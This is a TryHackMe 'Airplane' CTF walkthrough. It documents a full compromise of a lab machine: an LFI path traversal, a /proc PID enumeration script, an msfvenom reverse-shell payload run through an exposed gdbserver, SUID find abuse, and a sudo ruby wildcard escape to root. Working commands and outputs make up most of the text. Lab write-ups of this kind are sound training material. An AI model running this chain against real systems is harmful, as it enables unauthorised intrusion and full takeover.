---
title: "TryHackMe: Airplane CTF Walkthrough"
categories: [Writeups]
tags: [Writeups, TryHackMe]
image:
  path: assets/img/posts/tryhackme/airplane-ctf/6b9f423bda07437c11975e4db7892bee.svg
---

## Port Enumeration

Command:

```json
nmap 10.64.186.250 -sT -T5 -vvv -p-
```

Result:

```json
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
6048/tcp open  x11      syn-ack
8000/tcp open  http-alt syn-ack
```

## Service Enumeration

Command:

```json
nmap 10.64.186.250 -sV -T5 -vvv -p 22,6048,8000
```

Result:

```json
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6048/tcp open  x11?    syn-ack ttl 62
8000/tcp open  http    syn-ack ttl 62 Werkzeug httpd 3.0.2 (Python 3.8.10)
```

## Web Enumeration

```json
http://airplane.thm:8000/?page=index.html
```

Because of the structure of the URL i thought of LFI attack

```json
http://airplane.thm:8000/?page=../../../../etc/passwd
```

It worked, it downloaded a file containing the `/etc/passwd` content

### proc/self/environ

```json
LANG=en_US.UTF-8^@LC_ADDRESS=tr_TR.UTF-8^@LC_IDENTIFICATION=tr_TR.UTF-8^@LC_MEASUREMENT=tr_TR.UTF-8^@LC_MONETARY=tr_TR.UTF-8^@LC_NAME=tr_TR.UTF-8^@LC_NUMERIC=tr_TR.UTF-8^@LC_PAPER=tr_TR.UTF-8^@LC_TELEPHONE=tr_TR.UTF-8^@LC_TIME=tr_TR.UTF-8^@PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin^@HOME=/home/hudson^@LOGNAME=hudson^@USER=hudson^@SHELL=/bin/bash^@INVOCATION_ID=6fb3afa0bb7747f7ad440feb1f5b3175^@JOURNAL_STREAM=9:19016^@
```

### proc/self/cmdline

```json
/usr/bin/python3^@app.py^@
```

You are running as **`hudson`**.

Hudson's home is `/home/hudson`.

### proc/self/cwd/app.py

```json
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)

@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))

            return resp
        
        else:
            return "Page not found"

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)    

@app.route('/airplane')
def airplane():
    return render_template('airplane.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

### /etc/hosts

```json
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

## Process ID Enumeration

```json
import requests
import time

# CONFIGURATION
TARGET_URL = "http://airplane.thm:8000/?page="  # Replace with the actual vulnerable endpoint
SLEEP_BETWEEN_REQUESTS = 0.05  # Time between requests (in seconds)
PID_RANGE = range(1, 1000)     # Tune this to scan more PIDs
def get_cmdline(pid):
    target = f"{TARGET_URL}../../../../../proc/{pid}/cmdline"
    try:
        response = requests.get(target, timeout=5)
        print(f"[+] Trying PID {pid} => Status {response.status_code}")
        if response.status_code == 200:
            content = response.text.strip()
            if "Page not found" in content or len(content) < 5:
                pass
            else:
                clean = content.replace('\\x00', ' ').strip()
                print(f"    [FOUND] PID {pid} CMDLINE: {clean}")
                return clean
        else:
            print(f"    [?] Unexpected status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[!] Error on PID {pid}: {e}")
    return None
def main():
    print(f"[*] Starting LFI /proc/<pid>/cmdline enumeration on {TARGET_URL}")
    for pid in PID_RANGE:
        get_cmdline(pid)
        time.sleep(SLEEP_BETWEEN_REQUESTS)
if __name__ == "__main__":
    main()
```

![image.png](assets/img/posts/tryhackme/airplane-ctf/image.png)

Payload:

```json
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
```

Listener:

```json
nc -lvnp 4444
```

- Abra o gdb: `gdb shell.elf`
- Dentro do gdb, conecte-se ao avião:
`target extended-remote airplane.thm:6048`
- Faça o upload e execute:
`remote put shell.elf /tmp/shell.elf set remote exec-file /tmp/shell.elf run`

Quando você digitar `run` no GDB, ele vai enviar o seu arquivo `shell.elf` para a pasta `/tmp` da vítima e executá-lo. Se tudo der certo, a sua aba do `nc` vai "pipocar" com uma shell ativa.

```json
hudson@airplane:/opt$ whoami
whoami
hudson
hudson@airplane:/opt$ 
```

## Privesc

```json
find / -perm -4000 -type f 2>/dev/null

/usr/bin/find
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/vmware-user-suid-wrapper
/usr/bin/mount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
```

```json
hudson@airplane:/opt$ ls -la /usr/bin/find       
ls -la /usr/bin/find
-rwsr-xr-x 1 carlos carlos 320160 Feb 18  2020 /usr/bin/find
```

```json
hudson@airplane:/home/hudson/Desktop$ find . -exec /bin/sh -p \; -quit
$ id

uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
```

```json
cat user.txt
eebfca2ca5a2b8a56c46c781aeea7562
```

Added my public key to the authorized_keys of carlos and entered with ssh and ran sudo -l

```json
/usr/bin/ruby /root/*.rb
```

```json
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
carlos@airplane:~$ echo 'exec "/bin/sh"' > /tmp/exploit.rb
carlos@airplane:~$ sudo /usr/bin/ruby /root/../tmp/exploit.rb
# id
uid=0(root) gid=0(root) groups=0(root)

```

```json
cat  root.txt
190dcbeb688ce5fe029f26a1e5fce002

```
